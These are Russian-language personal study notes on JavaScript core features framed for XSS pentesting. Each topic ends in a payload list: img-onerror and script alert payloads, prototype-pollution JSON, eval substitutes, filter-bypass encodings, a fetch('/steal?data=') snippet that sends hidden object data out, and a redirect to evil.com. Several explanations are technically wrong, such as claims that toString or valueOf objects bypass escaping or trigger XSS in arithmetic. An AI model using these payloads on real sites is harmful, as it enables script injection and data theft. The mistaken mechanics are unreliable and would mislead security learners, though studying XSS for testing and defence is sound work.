
-----

структурир план 

### **БЛОК 1: ЯДРО ЯЗЫКА**

✅ **1.1 Типы данных** — примитивы, объекты, Symbol, BigInt, typeof (и его баги)  
✅ **1.2 Приведение типов** — явное/неявное, ToString/ToNumber/ToBoolean, == vs`===`, [] + {}  
✅ **1.3 Функции** — declaration/expression, стрелочные, IIFE, замыкания, hoisting, call/apply/bind  
✅ **1.4 Объекты** — литералы, конструкторы, дескрипторы, прототипы (`__proto__`), this  
✅ **1.5 Массивы** — методы (map/filter/reduce), итераторы, генераторы  
✅ **1.6 Циклы и условия** — for, while, for...in/of, switch, тернарник, &&/||  
✅ **1.7 Классы** — constructor, static, private, extends, instanceof  
✅ **1.8 Ошибки** — try/catch, throw, stack trace, кастомные ошибки

### **БЛОК 2: АСИНХРОННОСТЬ**

✅ **2.1 Event Loop** — call stack, micro/macro tasks, setTimeout  
✅ **2.2 Промисы** — создание, then/catch, all/race, промисификация  
✅ **2.3 Async/Await** — async функции, await, try/catch, parallel/sequential  
✅ **2.4 События** — EventTarget, фазы, stopPropagation, кастомные события

### **БЛОК 3: ВСТРОЕННЫЕ ОБЪЕКТЫ**

✅ **3.1 Object** — keys/values, defineProperty, getPrototypeOf, freeze, hasOwnProperty  
✅ **3.2 String** — все методы (charAt, slice, replace, split, fromCharCode)  
✅ **3.3 Array** — продвинутые (flat, reverse, sort, splice, reduce)  
✅ **3.4 Number & Math** — isNaN, parseInt, random, округления  
✅ **3.5 Date** — создание, get/set, timestamps  
✅ **3.6 RegExp** — literal/constructor, флаги, группы, lookahead  
✅ **3.7 Map/Set/Weak** — различия, итерация, слабые ссылки

### **БЛОК 4: BROWSER API (СВЯТАЯ ТРОИЦА)**

✅ **4.1 Window** — location, history, navigator, frames, opener  
✅ **4.2 Document** — поиск, навигация, создание, innerHTML, write  
✅ **4.3 Element** — атрибуты, classList, style, координаты, события  
✅ **4.4 События** — мышь, клава, формы, touch, drag&drop  
✅ **4.5 Storage** — localStorage, sessionStorage, cookies, IndexedDB  
✅ **4.6 Fetch/Network** — fetch, XHR, WebSocket, CORS, CSP  
✅ **4.7 Timers** — setTimeout, setInterval, animationFrame  
✅ **4.8 Encoding** — encodeURI, base64, TextEncoder  
✅ **4.9 Web APIs** — geolocation, camera, clipboard, workers, WebRTC

### **БЛОК 5: БЕЗОПАСНОСТЬ**

✅ **5.1 Same-Origin Policy** — происхождение, исключения, postMessage  
✅ **5.2 CSP** — директивы, nonce, обход через JSONP  
✅ **5.3 Cookies** — HttpOnly, Secure, SameSite  
✅ **5.4 iframe** — sandbox, frame busting, clickjacking

### **БЛОК 6: ПРОДВИНУТЫЕ ТЕМЫ**

✅ **6.1 Обход фильтров** — без кавычек, шаблоны, конструкторы, кодировки  
✅ **6.2 DOM Clobbering** — переопределение через id формы  
✅ **6.3 Prototype Pollution** — `__proto__`, merge, обход проверок  
✅ **6.4 Template Injection** — Vue/React опасные практики





-----------
-------
--------

## **БЛОК 1: ЯДРО ЯЗЫКА 

### 1.1 Типы данных + с фокусом на безопасность


// Примитивы и объекты - как это ломать

```javaScript
// ПРИМИТИВЫ (хранятся по значению)
// - string, number, boolean, null, undefined, symbol, bigint
let a = 'XSS';
let b = a;
b = 'alert(1)';
console.log(a); 

// ОБЪЕКТЫ (хранятся по ссылке)
let c = { payload: 'XSS' }; // это обьект с прототипом ключ/значение (почки как dictonary в свифте) но может хранить любые типы одновременно как в питоне
let d = c;
d.payload = 'alert(1)';  // достаю значения через точку! через ключ/значение
console.log(c.payload); // 'alert(1)' - изменилось, потому что ссылка

` КАК ЭТО ЛОМАТЬ ДЛЯ XSS:`
 `1.` //Если приложение копирует объекты неправильно (поверхностно)
function unsafeClone(obj) {  // да - функ них не делает
    return obj; // ЭТО НЕ КЛОН, ЭТО ССЫЛКА!
}

let userInput = { script: '<script>alert(1)</script>' };
let cloned = unsafeClone(userInput);
cloned.script = 'window.location="http://evil.com"';
// userInput.script ТОЖЕ ИЗМЕНИЛСЯ - бага для XSS - типо это одна общ у них ссылка на яч памяти
// типо userInput тоже поменялся и везде где он используется = будет тот вредонос пейлоад

`2` Мутация прототипов (Prototype Pollution)
let obj = {};
obj.__proto__.polluted = 'XSS payload'; // `__proto__` — это геттер/сеттер, который показывает/меняет прототип объекта,  а  св-во .polluted  добавляет всем его обьектам значение (вредоносное)
// Теперь у ВСЕХ объектов есть свойство polluted!
let newObj = {}; // // это обьект с прототипом ключ/значение
console.log(newObj.polluted); // 'XSS payload' - пиjдец
// я изменил polluted прототип для всех ВАЩЕ обьектов в коде приложения и всем присвоилось значение 'XSS payload' (какая-то жесть ваще)
// можно контрить - не испоьзуя в коде __proto__

`3`. Объекты, которые ведут себя как примитивы
let maliciousObj = {
    toString() {
        return '<img src=x onerror=alert(1)>';
    }
};
// Если где-то сделают конкатенацию со строкой
let result = 'User input: ' + maliciousObj; // ТРИГГЕР XSS! ничего удивительного .. нет валидаций никакой




👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉
--------------------------------------
ПЕЙЛОАДЫ

### 1. **Поверхностное копирование (ссылка вместо клона)**

{ script: '<script>alert(1)</script>' }

Передаешь в функцию, которая возвращает объект без копирования. Изменение "клона" меняет оригинал.
--------------------------------------
### 2. **Prototype Pollution через `__proto__`**

{ "__proto__": { "polluted": "<img src=x onerror=alert(1)>" } }

В JSON или при мерже объектов. Заражает все объекты в приложении.
--------------------------------------
### 3. **Объект с кастомным `toString()`**

{
    toString: () => '<img src=x onerror=alert(1)>'
}

При конкатенации со строкой или в шаблонных литералах — XSS.
--------------------------------------
### 4. **Объект с кастомным `valueOf()`**

{
    valueOf: () => '<img src=x onerror=alert(1)>'
}

В математических операциях — приведет к строке с XSS.
--------------------------------------
### 5. **Универсальный объект (и toString и valueOf)**

{
    toString: () => '<img src=x onerror=alert(1)>',
    valueOf: () => '<img src=x onerror=alert(1)>'
}

Работает в любом контексте приведения.
--------------------------------------
### 6. **Prototype Pollution через constructor**

{ "constructor": { "prototype": { "polluted": "XSS" } } }

Альтернативный путь загрязнения прототипа.
--------------------------------------
### 7. **Массив как объект (обходит проверки на объект)**

['<img src=x onerror=alert(1)>']

`typeof` вернет `"object"`, но при приведении к строке даст элементы через запятую.
--------------------------------------
### 8. **null для обхода проверок**

null

`typeof null === "object"`, но методов нет — вызывает ошибки.

```
✅

// Symbol 

```javaScript
// Symbol - уникальный идентификатор
// может использоваться для скрытого хранения данных
// - Создание приватных/скрытых свойств (не видны в `for...in`)
// - Избежание конфликтов имен

const sym1 = Symbol('id');
const sym2 = Symbol('id');
console.log(sym1 === sym2); // false - всегда уникальные

// Для пентеста - редкий способ скрыть данные
const SECRET_KEY = Symbol('secret');
let vulnerableApp = {
    [SECRET_KEY]: 'admin:password123', // Не перечисляется в for...in
    username: 'user'
};

`Обход:` Symbol.for()  -создает глобальные символы
const globalSym1 = Symbol.for('shared');
const globalSym2 = Symbol.for('shared');
console.log(globalSym1 === globalSym2); // true

// Можно перезаписать, если знаешь ключ
Object.getOwnPropertySymbols(vulnerableApp).forEach(sym => {  //  Метод getOwnPropertySymbols Возвращает массив символьных свойств объекта - там могут быть секреты
    if (sym.toString().includes('secret')) {
        vulnerableApp[sym] = 'HACKED'; // Уязвимость!
    }
});

// В XSS редко, но бывает для обхода фильтров
// Например, фильтр чистит строковые ключи, но пропускает Symbol


👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉
--------------------------------------
ПЕЙЛОАДЫ

### 1. **Доступ к скрытым данным через `getOwnPropertySymbols`**

// Кража данных, спрятанных в символах
let syms = Object.getOwnPropertySymbols(vulnerableApp);
syms.forEach(sym => {
    fetch('/steal?data=' + vulnerableApp[sym])
})
--------------------------------------
### 2. **Перезапись скрытых данных**

Object.getOwnPropertySymbols(vulnerableApp).forEach(sym => {
    if (sym.toString().includes('secret')) {
        vulnerableApp[sym] = 'HACKED'
    }
})
--------------------------------------
### 3. **Обход фильтров через Symbol как ключ**

let sym = Symbol('xss')
let payload = {
    [sym]: '<img src=x onerror=alert(1)>'
}
// Фильтр чистит строковые ключи, но символы пропускает
// Позже где-то используется payload[sym]
--------------------------------------
### 4. **Symbol.for() для доступа к глобальным символам**

// Если приложение использует глобальные символы
let sym = Symbol.for('shared')
// Получаем тот же символ, можем читать/писать
--------------------------------------
### 5. **Обход проверок на наличие свойств**

let sym = Symbol('admin')
if (user[sym]) { // проверка на существование
    // выполнится, если символ есть
}
--------------------------------------
### 6. **Создание конфликтов через известные символы**

// Переопределение встроенного поведения
Array.prototype[Symbol.iterator] = function() {
    alert('XSS при итерации!')
    return originalIterator
}
```
✅

// BigInt - для обхода фильтров чисел

```javaScript

/ В JS обычные числа не могут быть больше 9007199254740991
// BigInt - целые числа любой длины (n на конце)
const big = 9007199254740991n; // Больше MAX_SAFE_INTEGER
const another = BigInt('12345678901234567890');

// Арифметика с BigInt
console.log(5n + 3n); // 8n
console.log(5n + 5); // Ошибка! Нельзя смешивать с обычными числами

`КАК ЛОМАТЬ ЧЕРЕЗ BIGINT:`
// 1. Обход проверок на длину/размер
function isNumberTooLong(num) {
    return num > 1000; // Если num - BigInt, сравнение работает / 12n 
}

// 2. Неожиданное приведение в уязвимых местах
let evilBigInt = 1n;
if (evilBigInt == true) { // true! BigInt(1) == true
    console.log('Обманули проверку!');
} // заставил в функции выполнить условие и вывести принт

// 3. Через BigInt можно вызвать ошибки
try {
    let x = 1n;
    x(); // TypeError: x is not a function
    // Но stack trace может выдать инфу
} catch(e) {
	    console.log(e.stack); ` Иногда можно получить пути/имена ` что круто!
}

// 4. Обход фильтров, которые не ожидают BigInt
function sanitizeNumber(input) {
    return parseInt(input, 10); // BigInt превратится в обычное число
}
let malicious = BigInt('12345678901234567890');
let sanitized = sanitizeNumber(malicious); // 12345678901234567890? Неа, переполнение!



👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉
--------------------------------------
ПЕЙЛОАДЫ  BigInt 
--------------------------------------
### 1. **Обход проверки на длину/размер числа**

BigInt('12345678901234567890')

Если сервер проверяет `num > 1000` — пропустит, хотя число огромное
--------------------------------------
### 2. **Обход проверки через нестрогое равенство**

1n

// if (evilBigInt == true) сработает
--------------------------------------
### 3. **Вызов ошибки для получения stack trace**

(function(){ let x = 1n; x(); })()

В стеке могут быть пути к файлам, имена функций
--------------------------------------
### 4. **Обход parseInt/sanitize через BigInt**

BigInt('12345678901234567890')

`parseInt` вернет переполненное число или `1`
--------------------------------------
### 5. **Обход проверок на 0/null/undefined**

0n  // falsy как 0
1n  // truthy как 1
--------------------------------------
### 6. **Неожиданное сложение с обычными числами (вызов ошибки)**

5n + 5  // Ошибка! Может сломать логику
--------------------------------------
### 7. **Обход через сравнение с BigInt**

9007199254740991n

Если сервер проверяет `num <= MAX_SAFE_INTEGER` — BigInt проходит, хотя число больше
--------------------------------------
### 8. **В JSON (редко, но меть)**

{ "amount": "12345678901234567890n" }

```
✅

// typeof - как определение типа может подвести

```javaScript
console.log(typeof 42);           // "number"
console.log(typeof 'XSS');        // "string"
console.log(typeof true);         // "boolean"
console.log(typeof undefined);    // "undefined"
console.log(typeof {});           // "object"
console.log(typeof []);           // "object" - баг typeof - ведь это массив
console.log(typeof null);         // "object" - ИСТОРИЧЕСКИЙ БАГ!
console.log(typeof function(){}); // "function" (хотя это тоже объект)
console.log(typeof Symbol());     // "symbol" 
console.log(typeof 42n);          // "bigint"

----
`typeof` -не отличает массив от обычного объекта
typeof [1,2,3]      // "object"
typeof {a:1}        // тоже "object"
----
 если в коде есть проверка `typeof x === 'object'` — она пропустит и массивы, и объекты, и `null`. Часто ведет к багам и уязвимостям
------

` КАК ЭТО ЛОМАТЬ ДЛЯ XSS:`

// Разработчик проверяет, не функция ли это
if (typeof userInput === 'function') {
    block()
}
// Атакующий передает объект с кастомным toString
let evil = {
    toString: function() {
        return '<script>alert(1)</script>'
    }
}
// Потом где-то в коде делают строковую конкатенацию
element.innerHTML = 'Привет, ' + evil // XSS!

--------------------
// 2. Использование 
`бага с null`
function processInput(input) {
    if (typeof input === 'object' && input !== null) {
        return input.toString(); // Думаем, что это объект / toString() обернет в строку
    }
    return 'safe';
}
// null typeof === "object", но он не имеет методов!
processInput(null); // Ошибка: Cannot read property 'toString' of null
// Может сломать логику приложения
-----------
// 3. Массивы маскируются под объекты
let evilArray = ['<img src=x onerror=alert(1)>'];
function escapeHtml(obj) {
    if (typeof obj === 'object') {
        // Думаем что объект, пытаемся обойти рекурсивно
        for (let key in obj) {
            escapeHtml(obj[key]); // Рекурсия для каждого элемента
        }
    } else {
        // Экранируем строку
        obj = obj.replace(/</g, '&lt;'); // заменяет все < на &lt;
    }
    return obj;
}
// Но массив станет строкой позже, и экранирование не сработает!
document.body.innerHTML = escapeHtml(evilArray); // [object Array] вставится?
// **Свойство.** Содержит HTML-код внутри `<body>`
// читать норм let html = document.body.innerHTML // что внутри body
// но может и писать document.body.innerHTML = '<img src=x onerror=alert(1)>' // XSS!

-------

// 4. Проверка на функцию через typeof не защищает от eval
// eval  Выполняет строку как код = Ядро для XSS  - eval('alert(1)') =>> XSS
// `setTimeout('alert(1)', 0)       = тоже что и eval
// Function('alert(1)')()            = тоже что и eval
// [].map.constructor('alert(1)')()   = тоже что и eval 

и получаем xss через строку..

function safeExecute(fn) {
    if (typeof fn === 'function') {
        fn(); // Безопасно вызвать функцию
    } else {
        console.log('Not a function');
    }
}
// Но можно передать строку с кодом в другое место
let attack = 'alert(1)';
setTimeout(attack, 100); // setTimeout принимает строку как код!



--------------------------------------------
👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉
ПЕЙЛОАДЫ  typeof

 1. **Обход проверки на функцию через объект с toString**

let evil = {
    toString: function() {
        return '<script>alert(1)</script>'
    }
}
// typeof evil === 'object' - проходит проверку
// Позже в конкатенации: 'Привет, ' + evil -> XSS

--------------------------------------------
### 2. **Обход проверки на объект через null (слом логики)**

// processInput(null) вызывает ошибку
// Может обойти try/catch или вызвать падение приложения
null

--------------------------------------------
### 3. **Массив как объект (обход рекурсивного экранирования)**

let evilArray = ['<img src=x onerror=alert(1)>']
// typeof evilArray === 'object' - проходит в ветку для объектов
// Рекурсия не экранирует, потом массив становится строкой с XSS
--------------------------------------------
### 4. **Строка в setTimeout (обход проверки на функцию)**

let attack = 'alert(1)'
setTimeout(attack, 100)
// typeof attack === 'string' - не функция, но setTimeout выполняет как код
--------------------------------------------
### 5. **Через eval конструкторы (когда блокируют только eval)**

Function('alert(1)')()
// или
[].map.constructor('alert(1)')()
--------------------------------------------
### 6. **Обход проверки на объект через примитивы**

"0"  // строка - пройдет if (userInput)
[]   // массив (object) - truthy
{}   // объект - truthy
--------------------------------------------
### 7. **Через Symbol (редко, но меть)**

let sym = Symbol('xss')
// typeof sym === 'symbol' - может обойти проверки на string/object

```
✅



Для пентеста:  приведение типов -для XSS


```javaScript
// ГЛАВНОЕ ПРАВИЛО: В JS ВСЕ СТРЕМИТСЯ СТАТЬ СТРОКОЙ ИЛИ ЧИСЛОМ

// 1. Строковое окружение - всё в строку
console.log('XSS: ' + 123);        // "XSS: 123"
console.log('XSS: ' + true);       // "XSS: true"
console.log('XSS: ' + [1,2,3]);    // "XSS: 1,2,3"
console.log('XSS: ' + {a:1});      // "XSS: [object Object]"

// XSS-вектор: если пользовательские данные попадают в контекст строки
function renderUserInput(input) {
    return '<div>' + input + '</div>'; // input приводится к строке
}
// Если input = { toString: () => '<img src=x onerror=alert(1)>' }
// То внутри div окажется вредоносный HTML!
// если хоть один операнд строковый и оператор (+) тогда все в строку превратиться!


// 2. Числовое окружение - всё в число
console.log('5' - 3);      // 2 (строка стала числом)
console.log('5' * '3');    // 15 (обе строки стали числами)
console.log(true - 1);     // 0 (true = 1)
console.log(false * 10);   // 0 (false = 0)
console.log(null + 5);     // 5 (null = 0)
console.log(undefined + 5);// NaN (undefined = NaN)

`XSS-вектор: обход фильтров на <  > через числа`

function filterXSS(input) {
    return input.replace(/[<>]/g, ''); // удаляет все угловые скобки <  >
}
let attack = ['<', 'script', '>']; // Массив
let filtered = filterXSS(attack); 
// attack.toString() = "<,script,>" - запятые остались, но фильтр сработал?
// Результат: "<,script,>" - угловые скобки удалились? Нет, они были в строке массива - потому что передал массив а не просто строку!!!

` 3. Булево окружение - falsy и truthy значения`
// FALSY (становятся false при приведении к boolean):
// false, 0, -0, 0n, "", null, undefined, NaN

// TRUTHY (всё остальное):
// true, 1, "0", "false", [], {}, function(){}

**Truthy** — значение, которое в булевом контексте становится `true`.

` XSS-вектор: обход проверок `
if (userInput) { // Если userInput - пустая строка, проверка не пройдет
    executeDangerous(userInput);
}
// Но "0" пройдет проверку! Или пустой массив [] - тоже truthy!
//В JS **пустая строка** — это только `""` (ничего между кавычками).
// А  `"0"` — это строка длиной 1, содержащая символ `'0'`. Она truthy.
Boolean("")   // false
Boolean("0")  // true — потому что есть символ

` 4. Специальные объекты для приведения`
let xssPayload = {   // это цкликом весь пейлоад
    valueOf() {
        return '<img src=x onerror=alert(1)>';
    },
    toString() {
        return '<script>alert(1)</script>';
    }
};

xssPayload - обьект
{} - литерал обьекта

valueOf и  toString это нативные функции (Есть у каждого объекта от рождения
- Живут в `Object.prototype` 
  + - Все объекты их наследуют через цепочку прототипов)
    
// В числовом контексте вызовется valueOf
let num = +xssPayload; // Попытается привести к числу - получится NaN

// В строковом - toString
let str = '' + xssPayload; // "<script>alert(1)</script>" - XSS!

// 5. NaN - хитрая шляпа какая-то
console.log(typeof NaN);           // "number"
console.log(NaN === NaN);          // false! NaN не равен самому себе
console.log(NaN == NaN);           // false
console.log(isNaN(NaN));           // true
console.log(isNaN('XSS'));         // true ('XSS' приводится к NaN)
console.log(Number.isNaN('XSS'));  // false (не выполняет приведение)

// Обход фильтров через NaN
function validateNumber(input) {
    if (isNaN(input)) {
        return 0; // Заменяем NaN на безопасное значение
    }
    return input;
}
let bypass = '<script>'; // isNaN('<script>') = true -> вернет 0
// Но 0 может иметь другое значение в коде!
```
✅

### 1.2 Приведение типов 



// Явное vs неявное
```javaScript

// ЯВНОЕ ПРИВЕДЕНИЕ = когда программист сам вызывает функции
let str = String(123);        // "123"
let num = Number("123");      // 123
let bool = Boolean("hello");  // true
let int = parseInt("123px");  // 123
let float = parseFloat("3.14"); // 3.14

// Для XSS: явное приведение реже, но тоже может быть опасным
function safeHTML(str) {
    return String(str).replace(/</g, '&lt;'); удаляет < 
}
// Но если str - объект с кастомным toString, то String(obj) вызовет его!

let evil = {
    toString: () => '<script>alert(1)</script>'
};
safeHTML(evil); // Вызовет evil.toString() -> XSS в replace не попадет!

// НЕЯВНОЕ ПРИВЕДЕНИЕ (JS сам решает за тебя)
console.log(5 + "5");        // "55" (число стало строкой)
console.log("5" - 1);        // 4 (строка стала числом)
console.log(true + false);   // 1 (true=1, false=0)
console.log(!"XSS");         // false (строка стала true, потом инверт)

 `console.log("XSS")` — выведет **строку** `"XSS"`
    
 `console.log(!"XSS")` — выведет **булево значение** `false`

---------------

// Для XSS: неявное приведение - золотая жила
function displayMessage(msg) {
    document.getElementById('output').innerHTML = "Message: " + msg;
    // msg приводится к строке через ToString
}
// Если msg = { toString: () => '<img src=x onerror=alert(1)>' }
// Получаем XSS!

- `document.getElementById('output')` — находит элемент с `id="output"`
   
- `.innerHTML` — свойство, содержащее HTML внутри элемента








---------
-----------------

-------------------
👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉

Пейлоады для проверки XSS (явное/неявное приведение)
--------------------------------------------------------
 1. **Обход через объект с кастомным `toString()`**

{ toString: () => '<img src=x onerror=alert(1)>' }

Куда вставлять: в места, где значение приводится к строке (конкатенация, `String()`)
--------------------------------------------------------
### 2. **Обход через объект с кастомным `valueOf()`**

{ valueOf: () => '<img src=x onerror=alert(1)>' }

Куда вставлять: в математические операции (`+`, `-`, `*`, `/`)

--------------------------------------------------------
 3. **Универсальный (и `toString` и `valueOf`)**


{
  toString: () => '<img src=x onerror=alert(1)>',
  valueOf: () => '<img src=x onerror=alert(1)>'
}

--------------------------------------------------------
 4. **Через массив с `toString()`**

['<img src=x onerror=alert(1)>']

Массив при приведении к строке вызывает `join(',')`

--------------------------------------------------------
 5. **Через Symbol.toPrimitive**

{
  [Symbol.toPrimitive]: (hint) => '<img src=x onerror=alert(1)>'
}

Перехватывает ВСЕ попытки приведения (и к строке, и к числу)

--------------------------------------------------------
 6. **Через `String()` конструктор**

String('<img src=x onerror=alert(1)>')

Если фильтр не ожидает, что `String()` можно вызвать с XSS

--------------------------------------------------------
 7. **Через `Number()` с последующей конкатенацией**

Number('<img src=x onerror=alert(1)>') // NaN, но позже может стать строкой

--------------------------------------------------------
### 8. **Через `parseInt()`/`parseFloat()`**

parseInt('<img src=x onerror=alert(1)>') // NaN, но контекст важен

--------------------------------------------------------
### 9. **Комбинация с конкатенацией**

'Message: ' + { toString: () => '<img src=x onerror=alert(1)>' }

--------------------------------------------------------
### 10. **Через шаблонные строки**

`${ { toString: () => '<img src=x onerror=alert(1)>' } }`

--------------------------------------------------------
### 11. **Через оператор `+` (унарный)**

+{ valueOf: () => '<img src=x onerror=alert(1)>' }

--------------------------------------------------------
### 12. **Через оператор `>` (сравнение)**


{ valueOf: () => '<img src=x onerror=alert(1)>' } > 0

--------------------------------------------------------
### 13. **Через логические операторы**


{ toString: () => '<img src=x onerror=alert(1)>' } && true

--------------------------------------------------------
### 14. **Через `if` условие**

if ({ toString: () => '<img src=x onerror=alert(1)>' }) { /* XSS */ }

--------------------------------------------------------
### 15. **Через `||` с фолбеком**


userInput || '<img src=x onerror=alert(1)>'

--------------------------------------------------------

```
✅

----

**Все выше пейлоады — это вариации 5-6 базовых идей:**

- Переопределение `toString`/`valueOf` (объекты-примитивы)
   
- Загрязнение прототипа (`__proto__`, `constructor`)
   
- Обход через систему типов (`typeof`, `instanceof`)
   
- Кодировки (`fromCharCode`, `\u0061`, base64)
   
- Конструкторы вместо `eval` (`Function`, `setTimeout`)
   
- Неожиданное приведение (`[] + {}`, `"0" == true`)

`XSS ПЕЙЛОАДЫ:

`├── HTML-контекст: <script>, <img onerror>, <svg onload>
`├── JS-контекст: 'alert(1)', "alert(1)", `alert(1)`
`├── Обход кавычек: alert(1), alert`1`
`├── Обход фильтров: \u0061lert, \x61lert, fromCharCode
`├── Обход eval: setTimeout, Function, constructor
`├── Объекты: {toString: () => 'XSS'}, {valueOf: () => 'XSS'}
`├── Prototype: {"__proto__": {"polluted": true}}
`└── Без букв: JSFuck, [[]+[]][+[]]


-------

// ToString, ToNumber, ToBoolean - алгоритмы преобразрвания в типы
```javaScript
` ToString АЛГОРИТМ (как JS превращает что-то в строку)`
// Для примитивов:
String(undefined);   // "undefined"
String(null);        // "null"
String(true);        // "true"
String(false);       // "false"
String(123);         // "123"
String(-0);          // "0" (минус исчез!)
String(Infinity);    // "Infinity"
String(-Infinity);   // "-Infinity"

// Для объектов: сначала valueOf(), потом toString()
let obj = {
    valueOf: () => 42,
    toString: () => "42"
};
String(obj); // "42" (использует toString после valueOf или как?)

//  порядок зависит от контекста
// В строковом контексте сначала toString, потом valueOf
let obj2 = {
    toString: () => "XSS",
    valueOf: () => 123
};
console.log('' + obj2); // "XSS" (использовался toString)

// В числовом - наоборот
console.log(+obj2); // 123 (использовался valueOf)
----------------------------------
`ToNumber АЛГОРИТМ`
Number(undefined);   // NaN
Number(null);        // 0
Number(true);        // 1
Number(false);       // 0
Number("123");       // 123
Number("123.5");     // 123.5
Number("");          // 0
Number("  123  ");   // 123 (пробелы обрезаются)
Number("123px");     // NaN (не число)
Number("0x10");      // 16 (шестнадцатеричная)

// Для объектов: сначала valueOf(), если не примитив - toString()
let numObj = {
    valueOf: () => "123" // valueOf может вернуть не число!
};
Number(numObj); // 123 (строка "123" потом стала числом)
------------------------------------
`ToBoolean АЛГОРИТМ`
Boolean(undefined);  // false
Boolean(null);       // false
Boolean(0);          // false
Boolean(-0);         // false
Boolean(NaN);        // false
Boolean("");         // false
Boolean(false);      // false

// ВСЁ ОСТАЛЬНОЕ - true
Boolean({});         // true (даже пустой объект)
Boolean([]);         // true (пустой массив)
Boolean("false");    // true (непустая строка)
Boolean("0");        // true (непустая строка)
Boolean(function(){}); // true

// XSS-вектор: truthy/falsy обходят проверки
if (userInput) {
    // Думают, что userInput не пустой и не null
    // Но userInput = "0" пройдет! И userInput = false пройдет? false не пройдет
    // userInput = [] пройдет! userInput = {} пройдет!
    processUnsafe(userInput);
}

👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉

Пейлоады для проверки XSS (явное/неявное приведение)
--------------------------------------------------------
### 1. **Обход строковых фильтров через ToString**

javascript

{
    toString: () => '<img src=x onerror=alert(1)>'
}

Где используется: конкатенация, шаблонные строки, `String()`

### 2. **Обход числовых проверок через valueOf**



{
    valueOf: () => '<img src=x onerror=alert(1)>'
}

Где используется: математические операции, унарный `+`

### 3. **Универсальный обход (и строка и число)**



{
    toString: () => '<script>alert(1)</script>',
    valueOf: () => '<img src=x onerror=alert(1)>'
}

### 4. **Обход проверок на пустоту (truthy)**



"0"           // строка с нулем - truthy
[]            // пустой массив - truthy
{}            // пустой объект - truthy
"false"       // строка - truthy
function(){}  // функция - truthy

### 5. **Обход проверок на наличие данных (falsy)**



0             // число 0 - falsy
""            // пустая строка - falsy
null          // null - falsy
undefined     // undefined - falsy
NaN           // NaN - falsy

### 6. **Через Symbol.toPrimitive (полный контроль)**



{
    [Symbol.toPrimitive]: (hint) => {
        if (hint === 'string') return '<img src=x onerror=alert(1)>';
        if (hint === 'number') return 1337;
        return 'default XSS';
    }
}

### 7. **Обход через Number() с неожиданным результатом**



"123px"        // Number() -> NaN, но может быть строкой позже
undefined      // Number() -> NaN
{ valueOf: () => "123" }  // Number() -> 123 (строка стала числом)

### 8. **Обход через String() с объектами**



String({ toString: () => '<img src=x onerror=alert(1)>' })

### 9. **Обход через Boolean() в условиях**



// if (userInput) пропустит:
"0"
[]
{}
"false"
0n

### 10. **Комбинация для разных контекстов**



let payload = {
    data: '<img src=x onerror=alert(1)>',
    toString() { return this.data },
    valueOf() { return this.data },
    [Symbol.toPrimitive](hint) { return this.data }
}
```
✅

// [] + {} vs {} + []   это разные хрени

```javaScript

// КЛАССИКА JS 

// СЛУЧАЙ 1: [] + {}
console.log([] + {}); // "[object Object]"

// Как это работает:
// 1. [] приводится к строке: [].toString() = ""
// 2. {} приводится к строке: {}.toString() = "[object Object]"
// 3. Конкатенация строк: "" + "[object Object]" = "[object Object]"

// СЛУЧАЙ 2: {} + []
console.log({} + []); // 0? Или NaN? Или "[object Object]"?
// В КОНСОЛИ БРАУЗЕРА: {} + [] = 0 (в некоторых)
// В НОДЕ: {} + [] = 0
// В ФАЙЛЕ .js: {} + [] = 0 (если не в выражении)

// ПОЧЕМУ?
// В начале строки {} интерпретируется как БЛОК КОДА, а не объект
// { } + [] 
// 1. {} - пустой блок кода (ничего не делает)
// 2. + [] - унарный плюс к пустому массиву
// 3. + [] приводит [] к числу: Number([]) = 0
// ИТОГО: 0

// ЕЩЕ ВАРИАНТЫ:
console.log({} + [] + {}); // "0[object Object]" (блок + 0 + объект)
console.log([] + {} + []); // "[object Object]" (строка + строка)

// XSS-применение: обход фильтров через неоднозначность
// Если код исполняется через eval, можно подсунуть что-то такое
function evalUserCode(code) {
    eval(code); // code = "{} + []" может значить по-разному
}

// В разных контекстах результат разный!
// Это может сломать логику проверок

👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉

Пейлоады для проверки XSS (явное/неявное приведение)
`возвращают строки, которые потом могут стать XSS`
`eval()` — функция, которая выполняет строку как код
--------------------------------------------------------
### 1. **Базовый [] + {}**

[] + {}

Результат: `"[object Object]"`
--------------------------------------------------------
### 2. **Базовый {} + [] (в начале строки)**

{} + []

Результат: `0`
--------------------------------------------------------
### 3. **Обход через eval с разным результатом**

eval("[] + {}")

Результат: `"[object Object]"`
--------------------------------------------------------
### 4. **Обход через eval с блоком**

eval("{} + []")

Результат: `0`
--------------------------------------------------------
### 5. **Цепочка {} + [] + {}**

{} + [] + {}

Результат: `"0[object Object]"`
--------------------------------------------------------
### 6. **Цепочка [] + {} + []**

[] + {} + []

Результат: `"[object Object]"`
--------------------------------------------------------
### 7. **В выражении (чтобы не было блоком)**

({} + [])

Результат: `"[object Object]"` (теперь это объект, а не блок)
--------------------------------------------------------
### 8. **С числами для путаницы**

5 + [] + {}

Результат: `"5[object Object]"`
--------------------------------------------------------
### 9. **С числами и блоком**

5 + {} + []

Результат: `"5[object Object]"` (зависит от контекста)
--------------------------------------------------------
### 10. **Для обхода фильтров в eval**

eval("([] + {})")

Всегда `"[object Object]"`
--------------------------------------------------------
### 11. **Для обхода фильтров с блоком**


eval("({} + [])")

Всегда `"[object Object]"` (скобки заставляют быть выражением)
```
✅

// == алгоритм (ToPrimitive, ToNumber)   просто знать что оно есть в этом мире

```javaScript
` АЛГОРИТМ == (АБСТРАКТНОЕ РАВЕНСТВО)
// Правила (упрощенно):
// 1. Если типы одинаковые - сравнить (как ===)
// 2. Если null == undefined - true
// 3. Если один число, другой строка - строку в число
// 4. Если один булев - булев в число
// 5. Если объект и примитив - объект в примитив
`
` ПОЛНЫЙ АЛГОРИТМ (знать для обхода):
// 1. Если Type(x) == Type(y) -> x === y
// 2. Если x === null и y === undefined -> true
// 3. Если x === undefined и y === null -> true
// 4. Если Type(x) == Number и Type(y) == String -> x == ToNumber(y)
// 5. Если Type(x) == String и Type(y) == Number -> ToNumber(x) == y
// 6. Если Type(x) == Boolean -> ToNumber(x) == y
// 7. Если Type(y) == Boolean -> x == ToNumber(y)
